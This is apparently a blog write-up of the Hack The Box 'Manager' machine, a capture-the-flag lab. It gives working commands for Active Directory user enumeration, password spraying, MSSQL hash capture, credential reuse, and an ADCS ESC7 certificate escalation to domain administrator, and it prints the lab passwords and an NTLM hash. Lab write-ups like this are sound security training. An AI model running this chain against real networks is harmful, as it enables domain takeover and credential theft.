---
date: 2025-01-18
categories: [CTF, HTB]
title: "HTB - Manager"
tags: ['hashcat', 'impacket', 'linux', 'nmap', 'privilege escalation', 'rce', 'smb', 'windows']

description: "Manager - A walkthrough of the challenge with enumeration, exploitation and privilege escalation steps."
---

---
---

# HTB - Manager

NMAP

![image1](../resources/0aaa9860fd9a41b0ad8c934cd32f5256.png)
 
Add manager.htb to /etc/hosts

```bash
./kerbrute userenum --dc 10.129.217.154 -d manager.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -o users.txt

```

![image2](../resources/b2465f024a0c41519698f423a6e726c1.png)

```bash
cat users.txt | grep "VALID" | cut -d ":" -f 4 | cut -d " " -f 2 > validusers.txt

impacket-GetNPUsers manager.htb/ -users validusers.txt -no-pass -dc-ip manager.htb
```

![image3](../resources/254b9407b415478ab6610387debfca97.png)

- No ASRepRoasting to be done

- Not able to login with usernames and no password:
  
```bash
enum4linux -u "guest" -a manager.htb

```
- Extract the usernames:
  
```bash
cat validusers.txt | cut -d '@' -f1 > usernames.txt

```
- Got a using the usernames as passwords:
  
```bash
crackmapexec smb manager.htb -u usernames.txt -p usernames.txt --no-brute --continue-on-success

```

![image4](../resources/eea8a12ece0c459b93854c2005b25275.png)

**operator:operator**

**<u>MSSQL</u>**

- We do have port 1433 open - MSSQL:

- Using Windows' own **sqlcmd** - it doesn't work:
  
```bash
sqlcmd -S manager.htb,1433 -U operator -P operator -C

```

![image5](../resources/5d76c8f76d954958b795a9e18ec48cd5.png)

- But using impacket's tool mssqlclient:
  
```bash
impacket-mssqlclient -p 1433 manager/operator:operator@manager.htb -windows-auth

```

![image6](../resources/99b0ec907f5a4869bda3a02ed837b8fe.png)

We can connect specifying the **-windows-auth** parameter

It authenticates using Windows authentication, which could suggest that the 'operator' account is configured or works correctly under Windows authentication rather than SQL Server authentication

<u>List of extra commands:</u>


![image7](../resources/2f7494eef5664d589dd45345cb972db0.png)

```sql
SELECT @@VERSION -- to get the SQL Server version,
SELECT SYSTEM_USER -- to identify the current user,
SELECT name FROM master.sys.databases -- to list databases
USE DatabaseName; -- Use db
SELECT table_name FROM information_schema.tables WHERE table_type = 'BASE TABLE'; -- Show all tables in db
SELECT * FROM TableName; -- Show all information in table
```
----------------------------------------------------------------------------------------------------------------

- Tried to crack ntlm hashes with xp_dirtree and responder:

![image8](../resources/d4c0dd63c9f445b1afe8dd6696615a20.png)


![image9](../resources/76f151fbf7824747b249c7e0f170faa1.png)


![image10](../resources/9f9aedd0abbe4b4184e63beb28c32bde.png)


![image11](../resources/c78b85ef04ed479fa9c5ee31e2290425.png)

But hashcat got exhausted

----------------------------------------------------------------------------------------------------------------

- Using xp_dirtree we can list all the folders in c:\\

![image12](../resources/4d8818100ffc4512a8d55ed9ae323f53.png)

- The default IIS webserver directory is:  
**C:\inetpub\wwwroot**


![image13](../resources/64fb85956c6341f8b29c5f13b89d3bed.png)

Here we can see a .zip file

- Using wget we can download the file:
  
```bash
wget http://manager.htb/website-backup-27-07-23-old.zip

```

![image14](../resources/f3341b964f204c6eb1e6935054e02c92.png)

- We get credentials for raven in the **.old-conf.xml**:

![image15](../resources/2c6fe37d17114303965dc8c159082031.png)

**raven : R4v3nBe5tD3veloP3r!123**


![image16](../resources/3c3efa2fc52c4cacb9e4c6cc8e6c5501.png)

```bash
evil-winrm -i manager.htb -u raven -p 'R4v3nBe5tD3veloP3r!123'

```

![image17](../resources/003b757401604cd1be69a9ea7b0ed67a.png)

```bash
cat user.txt

```
- Check VMWare version:
  
```powershell
$vmwareToolsDir = "C:\Program Files\VMware\VMware Tools"
$vmwareToolsVersion = (Get-Item "$vmwareToolsDir\vmtoolsd.exe").VersionInfo.FileVersion
Write-Host "VMware Tools Version: $vmwareToolsVersion"

```

![image18](../resources/25dc1069185941a7a432cad977f77ca4.png)

- Upload Certify.exe:
**Certify is a C# tool to enumerate and abuse misconfigurations in Active Directory Certificate Services (AD CS)**

<https://github.com/GhostPack/Certify>

```bash
.\Certify.exe find /vulnerable

```

![image19](../resources/c8af8c2b87244e07bba9201823fd087a.png)

Raven has ManageCA and Enroll rights but there are no vulnerable templates

This does confirm however that there are ADCS services running


![image20](../resources/ede8fbf26aa64d33b6e422a1cdfab847.png)

- <u>This scenario is vulnerable to ESC7:</u>
<https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation>

<https://github.com/ly4k/Certipy?tab=readme-ov-file#esc7>

- **<u>Steps (on Kali):</u>**

```bash
certipy ca -ca 'manager-DC01-CA' -add-officer raven -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'

```

![image21](../resources/879f1ab119c14bfb9bbddd70c1e31605.png)

```bash
certipy ca -ca 'manager-DC01-CA' -enable-template SubCA -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'

```

![image22](../resources/949370e28b9f461db3da6d2925e8c6c4.png)

**<u>Attack</u>**

- If we have fulfilled the prerequisites for this attack, we can start by requesting a certificate based on the SubCA template.
This request will be denied, but we will **save the private key** and note down the **request ID**

```bash
certipy req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -target manager.htb -template SubCA -upn administrator@manager.htb

```

![image23](../resources/207f1cf8d6744258b457b6e55da46cec.png)

- With our Manage CA and Manage Certificates, we can then issue the failed certificate request with the ca command and the
-issue-request \<request ID\> parameter

```bash
certipy ca -ca 'manager-DC01-CA' -issue-request **13** -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'

```

![image24](../resources/939eb694d26b41f99d409f1092996575.png)

- And finally, we can retrieve the issued certificate with the req command and the -retrieve \<request ID\> parameter

```bash
certipy req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -target manager.htb -retrieve 13

```

![image25](../resources/b508267ecf5a40adaf179cc413aa3dd2.png)

- Now we have a **.pfx certificate** as the administrator

- Authenticate as the administrator:
  
```bash
certipy auth -pfx administrator.pfx -dc-ip 10.129.218.140

```

![image26](../resources/76c6fc86c8494ddb96624e3e89883ae4.png)

We get a NTP error because the time difference between my Kali machine and the DC is too big

- To synchronise the time, run:
  
```bash
sudo ntpdate -u manager.htb

```

![image27](../resources/89eb775c801241b0abd0b6b2f5273ab0.png)

These two steps, between the ntp sync and auth, needs to be quick

- And we get an administrator hash:

![image28](../resources/2d29121dc61448e18c2aeeb3ab32c5d1.png)

- Using the hash and evil-winrm:
  
```bash
evil-winrm -i manager.htb -u administrator -H ae5064c2f62317332c88629e025924ef

```

![image29](../resources/26f6cfb6503540428d9ae1ce1f6f9895.png)

```bash
cat root.txt

```
